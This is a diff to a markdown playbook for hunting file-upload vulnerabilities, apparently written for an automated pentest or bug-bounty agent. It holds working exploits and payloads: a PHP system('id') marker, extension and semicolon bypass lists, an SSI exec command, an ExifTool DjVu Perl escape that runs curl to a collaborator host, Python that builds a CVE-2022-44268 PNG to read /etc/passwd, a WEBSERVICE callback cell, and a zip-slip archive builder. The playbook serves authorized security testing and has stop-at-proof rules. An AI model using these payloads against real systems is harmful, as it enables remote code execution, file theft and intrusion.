@@ -26,20 +26,24 @@ An upload is a finding only when something **later** uses the bytes: the web ser
    | Script extension executed (PHP/JSP/ASPX) | one `<?php echo md5("UPUNIQ"); system("id"); ?>` or the stack's equivalent | md5 or `uid=` from **GET of the returned URL** |
    | HTML/SVG served same-origin, sniffed as active content | SVG/HTML below | script runs in a browser on that origin, or the response is `image/svg+xml` without attachment |
    | Image/doc pipeline (ImageMagick, Ghostscript, ffmpeg, LibreOffice, wkhtmltopdf, headless Chrome) | URL or file read **inside** the format | Collaborator hit or file bytes in the output |
-   | ZIP/TAR/7z extracted | path inside the archive | marker contents at the traversed path, fetched once |
+   | ZIP/TAR/7z extracted | path inside the archive (`../` and `..\\`) | marker contents at the traversed path, fetched once |
+   | Stored name left the upload directory | `filename="../mark-UNIQ.txt"` or `..\\mark-UNIQ.txt` | fetch the marker at that path once |
    | S3/CDN with `Content-Type` you set | HTML on a domain that is not the app origin | XSS only if that domain holds cookies or a privileged origin. Otherwise say "uploaded HTML on a sandbox domain" and do not claim ATO |
    | Download forced, never rendered, never parsed | stop | not a finding |
 
 5. **Extension games** only if a normal `.php`/`.jsp`/`.aspx` was rejected and the stack can execute that language. Order: alternative extension, double extension, case, trailing dot/space, content-type lie, magic-byte prefix. Null byte `%00` only on very old PHP. Stop at the first file that executes.
+
+6. **Temp-file race.** If the file is accepted and then disappears (AV/scanner deletes it seconds later), race the fetch against the delete — one burst of parallel GETs on the returned URL (`hunt-race-condition`). A single fetched marker is the proof, then stop.
 
 ## Bypasses (execution)
 
 | Goal | Names to try |
 |---|---|
 | PHP | `.php`, `.phtml`, `.php5`, `.phar`, `.php8`, `.inc`, `.php.`, `.php%20`, `.pHp` |
-| IIS / ASP | `.aspx`, `.ashx`, `.asmx`, `.cer`, `.config` |
+| IIS / ASP | `.aspx`, `.ashx`, `.asmx`, `.cer`, `.config`, `.aspx;.jpg`, `.ashx;.png` (semicolon path-info: handler sees `.aspx`, filter sees `.jpg`) |
 | Java | `.jsp`, `.jspx`, `.war` (only if the container auto-deploys — one probe) |
-| Apache handler | one `.htaccess` with `AddType application/x-httpd-php .mark` plus `shell.mark` that prints the marker |
+| Apache handler (nginx ignores `.htaccess`) | one `.htaccess` with `AddType application/x-httpd-php .mark` plus `shell.mark` that prints the marker |
+| SSI | `.shtml` / `.stm` with `<!--#echo var="DOCUMENT_NAME" -->` (prove parse) then one `<!--#exec cmd="id"-->` only if exec is enabled |
 | IIS handler | one `web.config` requestFiltering/handlers change, same marker |
 | PHP-FPM user.ini | `.user.ini` `auto_prepend_file` only if you can already upload a second file you control |
 | MIME trust | `Content-Type: image/jpeg` with a script body — only matters if the **fetcher** executes it |
@@ -72,7 +76,22 @@ fill 'url(http://UNIQUE.collab/mvg)'
 #EXTINF:1,
 http://UNIQUE.collab/hls
 ```
-Legacy ImageMagick delegates (`CVE-2016-3714` class) and Ghostscript `%!PS` file reads are in play only when a callback or file bytes return. If policy.xml blocks delegates, record that and move on. Do not upload a memory-corruption PoC.
+Legacy ImageMagick delegates (`CVE-2016-3714` class) and Ghostscript `%!PS` file reads are in play only when a callback or file bytes return. Ghostscript builds that still honor the `%pipe%` device (CVE-2023-36664 class) are command execution, not just file read — same one-callback bar. **ExifTool < 12.24 parsing your upload** (any app that reads or strips EXIF; the GitLab unauth RCE CVE-2021-22205 class): a DjVu annotation chunk carrying a Perl escape such as `\c${system('curl http://UNIQUE.collab/')}` executes at parse time — proof is the callback. If policy.xml blocks delegates, record that and move on. Do not upload a memory-corruption PoC.
+
+**PNG `profile` file read (CVE-2022-44268, ImageMagick before 7.1.0-50 and the matching 6.x).** A `tEXt` keyword `profile` whose value is an absolute path is embedded into the **processed** image as hex. The upload response that echoes your path is not the leak.
+
+```python
+from PIL import Image
+from PIL.PngImagePlugin import PngInfo
+img = Image.new("RGB", (8, 8))
+info = PngInfo()
+info.add_text("profile", "/etc/passwd")  # one path
+img.save("/tmp/mark.png", pnginfo=info)
+```
+
+Download the image the pipeline returned, hex-decode the `Raw profile type` chunk, and stop when you see `root:x:0:0`. No second path.
+
+**CSV / XLSX the app or another user opens.** One cell `=WEBSERVICE("https://UNIQUE.collab/csv")`. The finding is the callback from that client. A formula that only sits in storage is not impact.
 
 **HTML → PDF / screenshot**
 ```html
@@ -85,7 +104,7 @@ Proof is `root:x:0:0:` in the PDF/image, or the CSS/HTTP hit from the converter'
 ```python
 import zipfile
 z = zipfile.ZipFile('/tmp/slip.zip','w')
-zi = zipfile.ZipInfo('../mark-UNIQ.txt')
+zi = zipfile.ZipInfo('../mark-UNIQ.txt')  # also try ..\\mark-UNIQ.txt on a Windows extractor, one archive
 z.writestr(zi, b'mark-UNIQ')
 z.close()
 ```
@@ -98,8 +117,8 @@ Proof: fetch `mark-UNIQ.txt` or see `root:x:0:0:` from the symlink extraction. O
 
 ## Validation
 - **RCE:** GET the URL the app gave you; body contains `uid=` or the md5 hex of the literal `UPUNIQ`. A 200 from the upload API is not execution.
-- **XSS:** the browser runs the script on the target origin from the file URL. `text/plain` or `attachment` = no XSS.
-- **SSRF / XXE:** Collaborator hit from the server, or file contents inside the converted output.
+- **XSS:** the browser runs the script on the target origin from the file URL. `text/plain`, `Content-Disposition: attachment`, or `X-Content-Type-Options: nosniff` plus a non-HTML/SVG `Content-Type` = no XSS.
+- **SSRF / XXE / image profile:** Collaborator hit from the server, or file contents inside the converted output. For CVE-2022-44268 the hex is in the **processed** image, not the path string you uploaded.
 - **Traversal write:** the marker is readable at the escaped path. Then stop.
 - **Not a finding:** stored blob you cannot fetch, AV "skipped", polyglot that only opens as an image.
 
